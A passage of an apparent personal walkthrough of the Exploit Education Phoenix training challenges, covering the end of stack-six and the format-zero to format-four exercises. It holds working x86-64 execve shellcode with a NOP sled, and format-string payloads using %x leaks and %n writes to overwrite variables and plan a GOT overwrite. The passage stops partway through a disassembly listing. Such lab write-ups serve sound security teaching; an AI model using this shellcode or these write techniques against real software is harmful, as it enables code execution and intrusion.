0x7fffffffedf4: "SSH_CONNECTION=10.0.2.2 59494 10.0.2.15 22"
0x7fffffffee1f: "_=/opt/phoenix/amd64/stack-six"
0x7fffffffee3e: "OLDPWD=/home/user/new/new2"
0x7fffffffee59: "USER=user"
0x7fffffffee63: "PWD=/home/user/new/new2/new3"
0x7fffffffee80: "HOME=/home/user"
0x7fffffffee90: "SSH_CLIENT=10.0.2.2 59494 22"
0x7fffffffeead: "SSH_TTY=/dev/pts/0"
0x7fffffffeec0: "MAIL=/var/mail/user"
0x7fffffffeed4: "SHELL=/bin/bash"
0x7fffffffeee4: "TERM=xterm-256color"
0x7fffffffeef8: "SHLVL=1"
0x7fffffffef00: "ExploitEducation=", '\220' <repeats 99 times>, "\061\300H\273\321\235\226\221\320\214\227\377H\367\333ST_\231RWT^\260;\017\005"
0x7fffffffef90: "LOGNAME=user"
0x7fffffffef9d: "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
0x7fffffffefdb: "/opt/phoenix/amd64/stack-six"
...
0x7ffffffff000: <error: Cannot access memory at address 0x7ffffffff000>
(gdb) x/32xg 0x7fffffffe500
0x7fffffffe500: 0x0000000000000001      0x00007ffff7db6d0f
0x7fffffffe510: 0x00007ffff7ffc948      0x00000000000000a6
0x7fffffffe520: 0x00007fffffffe57f      0x0000000000000001
0x7fffffffe530: 0x9090909090909090      0x00007ffff7ffb300
0x7fffffffe540: 0x0000000000000000      0x0000000000600c00
0x7fffffffe550: 0x000000000040079b      0x0000000000000000
0x7fffffffe560: 0x0000000000000000      0x00007ffff7db6b1e
0x7fffffffe570: 0x00007ffff7ffb300      0x0a00000000000000
0x7fffffffe580: 0x00007ffff7ffb300      0x00007ffff7db9934
0x7fffffffe590: 0x050f3bb05e545752      0x00007fffffffe5c0
0x7fffffffe5a0: 0x00007fffffffe638      0x00000000004007f1
0x7fffffffe5b0: 0x00007fffffffe628      0x00000001ffffe638
0x7fffffffe5c0: 0x000000000040079b      0x00007fffffffef10
0x7fffffffe5d0: 0x0000000000000001      0x00007ffff7d8fd62
0x7fffffffe5e0: 0x0000000000000000      0x00007fffffffe620
0x7fffffffe5f0: 0x0000000000000000      0x00007ffff7ffdbc8
```

### Solved

```python
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
padding = "\x90" * (126 - len(shell))
print(padding+shell+'\xc0')
```

```bash
user@phoenix-amd64:~/new/new2/new3$ export ExploitEducation=$(python ~/alpha.py)
user@phoenix-amd64:~/new/new2/new3$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ���������������������������������������������������������������������������������������������������1�H�ѝ��Ќ��H��ST_�RWT^�;�����
$ whoami
phoenix-amd64-stack-six
$ 
```

## Challenge 8 - Format Zero

[Format Zero Code](https://exploit.education/phoenix/format-zero/). 

This is a relatively easy challenge once you know of the bug in sprintf. Since the user controls the format string part of sprintf, what is stopping the user from entering any percentage syntax like %x. %x leaks any value that is on the stack and that gets, but into the dest buffer. Since each hex value is 8 bytes long it will expand the user input greatly causing it to overflow the buffer. This overflow with change the changeme variable completing the challenge.

### Solved

```python
padding = "%x" * 14 + "AA"
print(padding)
```
```bash
user@phoenix-amd64:~$ python format-zero.py | /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

## Challenge 9 - Format One

[Format One Code](https://exploit.education/phoenix/format-one/). 

This challenge is like the last challenge except we need to change the changeme variable to 0x45764f6c. Like the last challenge we can overwrite the buffer by adding %xs into the input string. If we add the alphabet after we can see when and where the changeme variable is changed. I changed the number of %xs around and found that at 4 %xs the changeme variable is overwritten with our alphabet. We can see that changeme was changed to BDEF. The last thing we need to do is change the python script at that location to have \x6c\x4f\x76\x45. This will place them in a location for changeme to get changed to the value wee want competing the challenge.

```python
padding = "%x" * 4 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
print(padding)
```
```bash
user@phoenix-amd64:~$ python format-one.py | /opt/phoenix/amd64/format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Uh oh, 'changeme' is not the magic value, it is 0x45444342
```

### Solved

```python
padding = "%x" * 4 + "AA" + b'\x6c\x4f\x76\x45'
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-one.py | /opt/phoenix/amd64/format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!
```

## Challenge 10 - Format Two

[Format Two Code](https://exploit.education/phoenix/format-two/). 

Just like the last two challenges we are trying to overwrite a integer variable, changeme. Except this this time the printf call is in other function and changeme can't be overwritten as easy. If we make a python script with a bunch of "%x"s and use that has the command argument. We can see that the program prints a bunch of things. If we look closely we can that among the things 0x25 0x78 are printed again and again. That is %x in ASCII, which is what we gave the program in the command argument. This means whatever we give the program is put on the stack.

```python
padding = '%x' * 200
print(padding)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(python format-two.py)
Welcome to phoenix/format-two, brought to you by https://exploit.education
ffffd7601000f7f84b67ffffd5c0ffffd5a880485a0ffffd4a0ffffd7601003e878257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825ffffd5c0f7ffb000ffffd640f7f8f654ffffd6342ffffd640f7f8f6542ffffd634ffffd6408110f7f8f628f7ffb000ffffd630f7ffcc20080483be804852c2ffffd63480482fc80486110f7fc7d640000804839bffffd6308049780ffffd630ffffd6302ffffd743ffffd7600ffffd8f1ffffdeadffffded8ffffdee2ffffdef1ffffdf01ffffdf1effffdf31ffffdf45ffffdf59ffffdf69ffffdf71ffffdf7e����Better luck next time!
```

Since we know that any we give the program is put on the stack if we give it the location of the changeme variable. That will be placed on the stack were we can use "%n" to change the value. The reason "%n" changes the value that is of a variable located in another stack position. Is because "&n" takes a pointer and sets the variable in that location to the value given. Meaning we can put the location of the changme variable on the stack where we have access to it and tell "%n" to change the value of the variable that address is pointing to. We can use objdump to get the location of the changeme variable.

```bash
user@phoenix-amd64:~$ objdump -t /opt/phoenix/i486/format-two 

/opt/phoenix/i486/format-two:     file format elf32-i386

SYMBOL TABLE:
08048114 l    d  .interp        00000000 .interp
08048148 l    d  .hash  00000000 .hash
0804818c l    d  .dynsym        00000000 .dynsym
0804824c l    d  .dynstr        00000000 .dynstr
080482cc l    d  .rel.plt       00000000 .rel.plt
080482fc l    d  .init  00000000 .init
08048310 l    d  .plt   00000000 .plt
08048380 l    d  .text  00000000 .text
08048611 l    d  .fini  00000000 .fini
08048620 l    d  .rodata        00000000 .rodata
080486c4 l    d  .eh_frame_hdr  00000000 .eh_frame_hdr
080486e8 l    d  .eh_frame      00000000 .eh_frame
08049770 l    d  .ctors 00000000 .ctors
08049778 l    d  .dtors 00000000 .dtors
08049780 l    d  .dynamic       00000000 .dynamic
08049820 l    d  .got.plt       00000000 .got.plt
08049844 l    d  .data  00000000 .data
08049848 l    d  .bss   00000000 .bss
00000000 l    d  .comment       00000000 .comment
00000000 l    df *ABS*  00000000 crt1.c
00000000 l    df *ABS*  00000000 crtstuff.c
08049770 l     O .ctors 00000000 __CTOR_LIST__
08049778 l     O .dtors 00000000 __DTOR_LIST__
08048724 l     O .eh_frame      00000000 __EH_FRAME_BEGIN__
080483c0 l     F .text  00000000 deregister_tm_clones
08048400 l     F .text  00000000 register_tm_clones
08048450 l     F .text  00000000 __do_global_dtors_aux
08049848 l     O .bss   00000001 completed.5195
0804984c l     O .bss   00000004 dtor_idx.5197
080484d0 l     F .text  00000000 frame_dummy
08049850 l     O .bss   00000018 object.5207
00000000 l    df *ABS*  00000000 crtstuff.c
08049774 l     O .ctors 00000000 __CTOR_END__
0804876c l     O .eh_frame      00000000 __FRAME_END__
080485e0 l     F .text  00000000 __do_global_ctors_aux
00000000 l    df *ABS*  00000000 format-two.c
00000000 l    df *ABS*  00000000 
08049780 l     O .dynamic       00000000 _DYNAMIC
080486c4 l       .eh_frame_hdr  00000000 __GNU_EH_FRAME_HDR
08049820 l     O .got.plt       00000000 _GLOBAL_OFFSET_TABLE_
00000000       F *UND*  00000000 printf
08049848 g     O .data  00000000 .hidden __TMC_END__
0804977c g     O .dtors 00000000 .hidden __DTOR_END__
00000000       F *UND*  00000000 puts
08049844 g     O .data  00000000 .hidden __dso_handle
080482fc g     F .init  00000001 _init
08049868 g     O .bss   00000004 changeme
08048380 g       .text  00000000 _start
0804839b g     F .text  00000023 _start_c
00000000       F *UND*  00000000 strncpy
08049848 g       .bss   00000000 __bss_start
00000000       F *UND*  00000000 memset
0804852c g     F .text  000000ac main
08048611 g     F .fini  00000001 _fini
08048515 g     F .text  00000017 bounce
08049848 g       .data  00000000 _edata
0804986c g       .bss   00000000 _end
00000000       F *UND*  00000000 exit
00000000       F *UND*  00000000 __libc_start_main
```

Now we can write a python script that puts the changeme variable's address location on the stack surrounded by As and Bs to make it easy to find. We will also give the program a bunch of "%x"s to see whats on the stack.

```python
padding = "AAAAAAAA" + b'\x68\x98\x04\x08' + "BBBBBBBBB" + ('%x,') * 100
print(padding)
```

We can see the variable address is sandwiched in between 41s and 42s. Last last thing we need to do is place a “%n” after the except number of “%x”s that shows everything but the changeme variable’s address. We can just count the number of ,s shown before the address to get 13. So we change 200 in the script to 13 and add a “%n” at the end of the string to find the solution.

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(python format-two.py)
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAAAAAhBBBBBBBBBffffd7af,100,0,f7f84b67,ffffd610,ffffd5f8,80485a0,ffffd4f0,ffffd7af,100,3e8,41414141,41414141,8049868,42424242,42424242,2c782542,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,ffffd610,f7ffb000,ffffd690,Better luck next time!
```

### Solved

```python
padding = "AAAAAAAA" + b'\x68\x98\x04\x08' + "BBBBBBBBB" + ('%x,') * 13 + '%n'
print(padding)
```
```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(python format-two.py)
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAAAAAhBBBBBBBBBffffd8b2,100,0,f7f84b67,ffffd710,ffffd6f8,80485a0,ffffd5f0,ffffd8b2,100,3e8,41414141,41414141,Well done, the 'changeme' variable has been changed correctly!
```

## Challenge 11 - Format Three

[Format Three Code](https://exploit.education/phoenix/format-three/). 

Just like the last program we need to change the changeme variable by putting its address location on the stack and modifying it with "%n". Expect this time we need to change the variable to a specific value, 0x64457845. To start we need to get the changeme variable location using objdump. 

```bash
user@phoenix-amd64:~$ objdump -t  /opt/phoenix/i486/format-three 
/opt/phoenix/i486/format-three:     file format elf32-i386

SYMBOL TABLE:
08048114 l    d  .interp        00000000 .interp
08048148 l    d  .hash  00000000 .hash
08048188 l    d  .dynsym        00000000 .dynsym
08048238 l    d  .dynstr        00000000 .dynstr
080482b0 l    d  .rel.plt       00000000 .rel.plt
080482d8 l    d  .init  00000000 .init
080482f0 l    d  .plt   00000000 .plt
08048350 l    d  .text  00000000 .text
080485d1 l    d  .fini  00000000 .fini
080485e0 l    d  .rodata        00000000 .rodata
080486a8 l    d  .eh_frame_hdr  00000000 .eh_frame_hdr
080486cc l    d  .eh_frame      00000000 .eh_frame
08049750 l    d  .ctors 00000000 .ctors
08049758 l    d  .dtors 00000000 .dtors
08049760 l    d  .dynamic       00000000 .dynamic
08049800 l    d  .got.plt       00000000 .got.plt
08049820 l    d  .data  00000000 .data
08049824 l    d  .bss   00000000 .bss
00000000 l    d  .comment       00000000 .comment
00000000 l    df *ABS*  00000000 crt1.c
00000000 l    df *ABS*  00000000 crtstuff.c
08049750 l     O .ctors 00000000 __CTOR_LIST__
08049758 l     O .dtors 00000000 __DTOR_LIST__
08048708 l     O .eh_frame      00000000 __EH_FRAME_BEGIN__
08048390 l     F .text  00000000 deregister_tm_clones
080483d0 l     F .text  00000000 register_tm_clones
08048420 l     F .text  00000000 __do_global_dtors_aux
08049824 l     O .bss   00000001 completed.5195
08049828 l     O .bss   00000004 dtor_idx.5197
080484a0 l     F .text  00000000 frame_dummy
0804982c l     O .bss   00000018 object.5207
00000000 l    df *ABS*  00000000 crtstuff.c
08049754 l     O .ctors 00000000 __CTOR_END__
0804874c l     O .eh_frame      00000000 __FRAME_END__
080485a0 l     F .text  00000000 __do_global_ctors_aux
00000000 l    df *ABS*  00000000 format-three.c
00000000 l    df *ABS*  00000000 
08049760 l     O .dynamic       00000000 _DYNAMIC
080486a8 l       .eh_frame_hdr  00000000 __GNU_EH_FRAME_HDR
08049800 l     O .got.plt       00000000 _GLOBAL_OFFSET_TABLE_
00000000       F *UND*  00000000 printf
08049824 g     O .data  00000000 .hidden __TMC_END__
0804975c g     O .dtors 00000000 .hidden __DTOR_END__
00000000       F *UND*  00000000 puts
08049820 g     O .data  00000000 .hidden __dso_handle
080482d8 g     F .init  00000001 _init
08049844 g     O .bss   00000004 changeme
08048350 g       .text  00000000 _start
0804836b g     F .text  00000023 _start_c
00000000       F *UND*  00000000 read
08049824 g       .bss   00000000 __bss_start
080484fc g     F .text  0000009b main
080485d1 g     F .fini  00000001 _fini
080484e5 g     F .text  00000017 bounce
08049824 g       .data  00000000 _edata
08049848 g       .bss   00000000 _end
00000000       F *UND*  00000000 exit
00000000       F *UND*  00000000 __libc_start_main
```

After getting the address we can make a script were we place it on the stack and get its location using "%x"s. We can also use As to help us find it. We can see the address on the stack just before the 41s. So now we can count the ,s and get the number of "%x"s we need before the %n, which is only 11.

```python
padding = "\x44\x98\x04\x08" + "AAAA" + "%x"*15
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DAAAA0,0,0,f7f81cf7,f7ffb000,ffffd738,8048556,ffffc730,ffffc730,fff,0,8049844,41414141,252c7825,78252c78,
Better luck next time - got 0x00000000, wanted 0x64457845!
```

Now we can write a script that uses "%n" that changes the changme value. We can see that the value change, but to 0x0000003e. Why? The value is changed to the amount of characters in the printf string before the %n. Also the only the first 2 bytes of the value is changed with the address we have. The reason for this is because the address only stores the first 2 bytes of the value. If we want to change the next 2 bytes we need to use the address, 0x08049845. The next 2 are changed with 0x08049846 and the last 2 with this 0x08049847.

```python
padding = "\x44\x98\x04\x08" + "%x"*11 + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DAAAA000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0
Better luck next time - got 0x0000003e, wanted 0x64457845!
```

We can create a script to test this and see if we can change the all the bytes of the changeme variable. As you can see that it does work and we get 0x46 for all sections. 

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "%n" + "%n" + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0
Better luck next time - got 0x46464646, wanted 0x64457845!
```

Since the value that the variable is being changed to is just the number of characters before the "%n". We can add a padding of As that changes each section to the value we want. The value we want in the first 2 bytes is 45. It is simple math to get how many As we need to pad before the "%n". Since the address is only holding 2 bytes we can add a byte to the value we want and subtract it to the value we need. This gets us the number of padding As we need. For example this is the math in hex 145-46=FF. FF hex is just 255, so we need 255 As before the first "%n" in our script. Using this script gets us the value we need in the first 2 bytes, but that is shared to all the rest.

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "%n" + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45454545, wanted 0x64457845!
```

The next 2 bytes we need the value 78. So if we do the same math as last time we get, 178-45=133. 133 in hex is 307 in decimal. That means we need to added 307 As before the second "%n" in our script. Trying this script out get us the value we want in both the first 4 bytes. 

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "A"*307 + "%n" + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x78787845, wanted 0x64457845!
```

The next 2 bytes we need the value 45. So doing the same math gets us, 145-78=CD. CD in hex is 205 in decimal. That means we need to added 205 As before the third "%n" in our script. Trying this script out get us the value we want in both the first 6 bytes. So the last value we want is 64. We do the math. 164-45=11F. 11F in hex is 287 in decimal. We add that to the script which is the solution to the challenge.

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "A"*307 + "%n" + "A"*205 + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45457845, wanted 0x64457845!
```

### Solved

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "A"*307 + "%n" + "A"*205 + "%n" + "A"*287 + "%n"
print(padding)
```
```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```

## Challenge 12 - Format Four

[Format Four Code](https://exploit.education/phoenix/format-four/). 

Unlike the last format type challenges we are not changing a variable. We are gonna have to change the GOT or Global Offset Table. The GOT is basically a table of that tells the program where linked library functions, ie like from the standard library, printf and exit, are located. The reason we care about these location is because if we we can change the GOT while the program is running we can redirect the call to a standard library function to another function like one we created. But, for this challenge we only need to redirect it to the congratulations function. We can use objdump to get the stack location of the function we want to overwrite. Since we need to use prinf and puts for the exploit the best function to overwrite is the exit function. Which its address is 080497e4. We also want to get the location of the congratulations function which is 08048503.

```bash
user@phoenix-amd64:~$ objdump -R /opt/phoenix/i486/format-four 

/opt/phoenix/i486/format-four:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497d8 R_386_JUMP_SLOT   printf
080497dc R_386_JUMP_SLOT   puts
080497e0 R_386_JUMP_SLOT   read
080497e4 R_386_JUMP_SLOT   exit
080497e8 R_386_JUMP_SLOT   __libc_start_main

user@phoenix-amd64:~$ objdump -d /opt/phoenix/i486/format-four 

/opt/phoenix/i486/format-four:     file format elf32-i386


Disassembly of section .init:

080482d8 <_init>:
 80482d8:       83 ec 0c                sub    $0xc,%esp
 80482db:       e8 c0 01 00 00          call   80484a0 <frame_dummy>
 80482e0:       e8 ab 02 00 00          call   8048590 <__do_global_ctors_aux>
 80482e5:       83 c4 0c                add    $0xc,%esp
 80482e8:       c3                      ret    

Disassembly of section .plt:

080482f0 <.plt>:
 80482f0:       ff 35 d0 97 04 08       pushl  0x80497d0
 80482f6:       ff 25 d4 97 04 08       jmp    *0x80497d4
 80482fc:       00 00                   add    %al,(%eax)
        ...

08048300 <printf@plt>:
 8048300:       ff 25 d8 97 04 08       jmp    *0x80497d8
 8048306:       68 00 00 00 00          push   $0x0
 804830b:       e9 e0 ff ff ff          jmp    80482f0 <.plt>

08048310 <puts@plt>:
 8048310:       ff 25 dc 97 04 08       jmp    *0x80497dc
 8048316:       68 08 00 00 00          push   $0x8
 804831b:       e9 d0 ff ff ff          jmp    80482f0 <.plt>

08048320 <read@plt>:
 8048320:       ff 25 e0 97 04 08       jmp    *0x80497e0
 8048326:       68 10 00 00 00          push   $0x10
 804832b:       e9 c0 ff ff ff          jmp    80482f0 <.plt>

08048330 <exit@plt>:
 8048330:       ff 25 e4 97 04 08       jmp    *0x80497e4
 8048336:       68 18 00 00 00          push   $0x18
 804833b:       e9 b0 ff ff ff          jmp    80482f0 <.plt>

08048340 <__libc_start_main@plt>:
 8048340:       ff 25 e8 97 04 08       jmp    *0x80497e8
 8048346:       68 20 00 00 00          push   $0x20
 804834b:       e9 a0 ff ff ff          jmp    80482f0 <.plt>

Disassembly of section .text:

08048350 <_start>:
 8048350:       31 ed                   xor    %ebp,%ebp
 8048352:       89 e0                   mov    %esp,%eax
 8048354:       83 e4 f0                and    $0xfffffff0,%esp
 8048357:       50                      push   %eax
 8048358:       50                      push   %eax
 8048359:       e8 00 00 00 00          call   804835e <_start+0xe>
 804835e:       81 04 24 ce 13 00 00    addl   $0x13ce,(%esp)
 8048365:       50                      push   %eax
 8048366:       e8 00 00 00 00          call   804836b <_start_c>

0804836b <_start_c>:
 804836b:       83 ec 14                sub    $0x14,%esp
 804836e:       8b 44 24 18             mov    0x18(%esp),%eax
 8048372:       6a 00                   push   $0x0
 8048374:       68 c1 85 04 08          push   $0x80485c1
 8048379:       68 d8 82 04 08          push   $0x80482d8
 804837e:       8d 50 04                lea    0x4(%eax),%edx
 8048381:       52                      push   %edx
 8048382:       ff 30                   pushl  (%eax)
 8048384:       68 23 85 04 08          push   $0x8048523
 8048389:       e8 b2 ff ff ff          call   8048340 <__libc_start_main@plt>
 804838e:       66 90                   xchg   %ax,%ax

08048390 <deregister_tm_clones>:
 8048390:       b8 f0 97 04 08          mov    $0x80497f0,%eax
 8048395:       3d f0 97 04 08          cmp    $0x80497f0,%eax
 804839a:       74 24                   je     80483c0 <deregister_tm_clones+0x30>
 804839c:       b8 00 00 00 00          mov    $0x0,%eax
 80483a1:       85 c0                   test   %eax,%eax
 80483a3:       74 1b                   je     80483c0 <deregister_tm_clones+0x30>
 80483a5:       55                      push   %ebp
 80483a6:       89 e5                   mov    %esp,%ebp
 80483a8:       83 ec 14                sub    $0x14,%esp
 80483ab:       68 f0 97 04 08          push   $0x80497f0
 80483b0:       ff d0                   call   *%eax
 80483b2:       83 c4 10                add    $0x10,%esp
 80483b5:       c9                      leave  
 80483b6:       c3                      ret    
 80483b7:       89 f6                   mov    %esi,%esi
 80483b9:       8d bc 27 00 00 00 00    lea    0x0(%edi,%eiz,1),%edi
 80483c0:       c3                      ret    
 80483c1:       eb 0d                   jmp    80483d0 <register_tm_clones>
 80483c3:       90                      nop
 80483c4:       90                      nop
 80483c5:       90                      nop
 80483c6:       90                      nop
 80483c7:       90                      nop
 80483c8:       90                      nop
 80483c9:       90                      nop
 80483ca:       90                      nop
 80483cb:       90                      nop
 80483cc:       90                      nop
 80483cd:       90                      nop
 80483ce:       90                      nop
 80483cf:       90                      nop

080483d0 <register_tm_clones>:
 80483d0:       b8 f0 97 04 08          mov    $0x80497f0,%eax
 80483d5:       2d f0 97 04 08          sub    $0x80497f0,%eax
 80483da:       c1 f8 02                sar    $0x2,%eax
 80483dd:       89 c2                   mov    %eax,%edx
 80483df:       c1 ea 1f                shr    $0x1f,%edx
 80483e2:       01 d0                   add    %edx,%eax
 80483e4:       d1 f8                   sar    %eax
